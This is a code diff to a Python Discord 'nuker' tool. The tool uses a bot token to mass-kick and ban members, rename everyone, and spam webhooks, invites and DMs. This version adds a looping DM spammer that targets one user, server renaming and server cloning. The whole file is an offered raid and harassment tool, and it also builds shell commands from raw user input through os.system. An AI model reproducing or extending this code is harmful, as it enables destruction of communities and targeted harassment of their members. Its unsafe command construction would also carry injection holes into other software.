@@ -23,36 +23,11 @@ banner="""
 
 discord.gg/jvrBvcCm72
 """
-version="beta 2.2 - v2"
+version="2.3 - v2"
 def printcolor(text):
     print(Colorate.Horizontal(Colors.purple_to_blue,text,1))
-#count sucess and fail
-def countsucessfail():
-    with open("result.log","r") as file:
-            success=0
-            ratelimited=0
-            noperm=0
-            fail=0
-            for line in file:
-                status_code = int(line.strip())
-                if status_code == 201 or status_code==200 or status_code==204:
-                            success += 1
-                elif status_code == 429:
-                    ratelimited += 1
-                elif status_code == 403:
-                    noperm += 1
-                else:
-                    fail +=1
-            file.close()
-            printcolor(f"{success} Requests with success")
-            printcolor(f"{ratelimited} Rate limited")
-            printcolor(f"{fail} Failed")
-            open("result.log","w").write("")
-            time.sleep(1.5)
 #varivbles importants
 guildverified=0
-cango=0
-count=0
 while True:
     os.system("cls")
     printcolor(banner)
@@ -91,6 +66,30 @@ while True:
     if guildverified==1:
         break
 #all ok
+#count sucess and fail
+def countsucessfail():
+    with open("result.log","r") as file:
+            success=0
+            ratelimited=0
+            noperm=0
+            fail=0
+            for line in file:
+                status_code = int(line.strip())
+                if status_code == 201 or status_code==200 or status_code==204:
+                            success += 1
+                elif status_code == 429:
+                    ratelimited += 1
+                elif status_code == 403:
+                    noperm += 1
+                else:
+                    fail +=1
+            file.close()
+            printcolor(f"{success} Requests with success")
+            printcolor(f"{ratelimited} Rate limited")
+            printcolor(f"{fail} Failed")
+            printcolor(f"{noperm} No Permission")
+            open("result.log","w").write("")
+            time.sleep(1.5)
 
 #the funcionally nuker 
 while True:
@@ -114,6 +113,8 @@ while True:
     printcolor("[9] Kick all                [10] Ban all                [11] Unban all          [12] Webhook Spammer")
     printcolor("[13] Invite Spammer         [14] Dm Spam")
     print()
+    printcolor("--Server Config--")
+    printcolor("[15] Change Server Name      [16] Clone Server          [17] Server Info Panel")
     cmd=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
     if cmd=="1":
         #create channels
@@ -215,7 +216,7 @@ while True:
         #nick name change
         printcolor("New name:")
         new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
-        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members", headers={"Authorization": f"Bot {token}"})
         if api.status_code==200:
             for people in api.json():
                 printcolor(f'requested user {people['user']['username']} rename to {new}')
@@ -241,7 +242,7 @@ while True:
         countsucessfail()
     elif cmd=="9":
         #kick all
-        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members", headers={"Authorization": f"Bot {token}"})
         if api.status_code==200:
             for people in api.json():
                 printcolor(f"requested to kick user {people['user']['username']}")
@@ -255,7 +256,7 @@ while True:
         #ban all
         printcolor("Ban reason:")
         new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
-        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
+        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members", headers={"Authorization": f"Bot {token}"})
         if api.status_code==200:
             for people in api.json():
                 printcolor(f"requested to ban user {people['user']['username']}")
@@ -293,28 +294,69 @@ while True:
         time.sleep(2)
         countsucessfail()
     elif cmd == "13":
+        #invite spammer
         printcolor("Repeat how many times per channel?")
-        new=int(input(">"))
+        new=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
         api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
         for channel in api.json():
             count=0
             while not count==new:
-                printcolor(f"[{count}] requested to create invite at {channel['name']}")
+                printcolor(f"[{count+1}] requested to create invite at {channel['name']}")
                 os.system(f"start src/invitecreate.pyw {token} {channel['id']}")
                 count +=1
         time.sleep(1.5)
         countsucessfail()
     elif cmd=="14":
         #dm spammer
-        printcolor("Message:")
+        print()
+        printcolor("[1] All Members         [2] One member")
         new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
-        api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
-        if api.status_code==200:
-            for people in api.json():
-                printcolor(f'send dm to {people['user']['username']}')
-                os.system(f'start src/dmsender.pyw {token} {people['user']['id']} "{new}"')
-        else:
-            print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
+        if new=="1":
+            printcolor("Message:")
+            new1=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+            api = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
+            if api.status_code==200:
+                for people in api.json():
+                    printcolor(f'send dm to {people['user']['username']}')
+                    os.system(f'start src/dmsender.pyw {token} {people['user']['id']} "{new1}" 0')
+            else:
+                print(Colorate.Color(Colors.red,f"Failed, error code {api.status_code}",1))
+            printcolor("Finished")
+            time.sleep(1.5)
+        elif new=="2":
+            printcolor("User ID:")
+            new=int(input(Colorate.Horizontal(Colors.purple_to_blue,">",1)))
+            printcolor("Loop? (y/n)")
+            api=input()
+            printcolor("Message:")
+            new1=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+            if api.lower() == "y":
+                while True:
+                    printcolor(f'send dm to {new}')
+                    os.system(f'start src/dmsender.pyw {token} {new} "{new1}" 1')
+            else:
+                printcolor(f'send dm to {new}')
+                os.system(f'start src/dmsender.pyw {token} {new} "{new1}" 0')
+                printcolor("Finished")
+                time.sleep(1.5)
+        countsucessfail()
+    elif cmd=="15":
+        #change server name
+        printcolor("New server name:")
+        new=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+        os.system(f"start src/changeservername.pyw {guildid} {token} {new}")
         printcolor("Finished")
         time.sleep(1.5)
         countsucessfail()
+    elif cmd == "16":
+        #server cloner
+        printcolor("Clonning...")
+        os.system(f"start src/servermodel.pyw {guildid} {token}")
+        printcolor("Finished")
+        time.sleep(1.5)
+        with open("servermodel.txt", "r") as log:
+            printcolor(log.read())
+        os.system("del servermodel.txt")
+        input("Press to continue")
+    elif cmd == "17":
+        os.system(f"start src/serverinfopanel.py {guildid} {token}")
